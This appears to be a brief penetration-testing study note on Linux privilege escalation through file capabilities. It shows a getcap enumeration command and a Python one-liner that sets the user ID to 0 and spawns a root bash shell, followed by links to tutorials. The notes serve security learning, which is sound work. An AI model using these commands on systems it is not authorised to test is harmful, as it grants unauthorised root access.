# Capabilities

- Similar to suid but more secure.

## Enumeration

- `getcap -r / 2>/dev/null`

## Exploitation

- In our example the command to enumerate gave us `/usr/bin/python2.6`  
![image](https://user-images.githubusercontent.com/96747355/170370598-258880d0-3303-4866-b4bb-46f7191b1542.png)
- We just need to run python with a command that will give us root `/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'`  
![image](https://user-images.githubusercontent.com/96747355/170371855-bdbbd738-2525-4f94-9232-0371c543cc58.png)  

## Resources

{% embed url="https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/" %} Linux Privilege Escalation using Capabilities {% endembed %}
{% embed url="https://mn3m.info/posts/suid-vs-capabilities/" %}SUID vs Capabilities {% endembed %}
{% embed url="https://medium.com/@int0x33/day-44-linux-capabilities-privilege-escalation-via-openssl-with-selinux-enabled-and-enforced-74d2bec02099" %}Linux Capabilities Privilege Escalation {% endembed %}
{% embed url="https://academy.tcm-sec.com/p/linux-privilege-escalation" %} TCM Security - Linux Privilege Escalation {% endembed %}
